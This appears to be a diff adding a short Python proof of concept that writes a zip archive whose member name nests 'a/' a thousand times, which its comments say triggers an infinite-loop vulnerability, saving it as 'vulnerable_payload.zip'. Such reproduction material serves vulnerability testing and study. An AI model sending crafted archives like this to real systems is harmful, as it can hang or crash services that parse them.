@@ -1,0 +1,14 @@
+```python
+import zipfile
+import io
+
+# Create a specially crafted zip file that triggers the vulnerability
+payload_zip = io.BytesIO()
+with zipfile.ZipFile(payload_zip, 'w') as z:
+    # Add a file with a name that causes the infinite loop
+    z.writestr('a/' * 1000 + 'file.txt', 'This is a test.')
+
+# Save the payload to a file
+with open('vulnerable_payload.zip', 'wb') as f:
+    f.write(payload_zip.getvalue())
+```
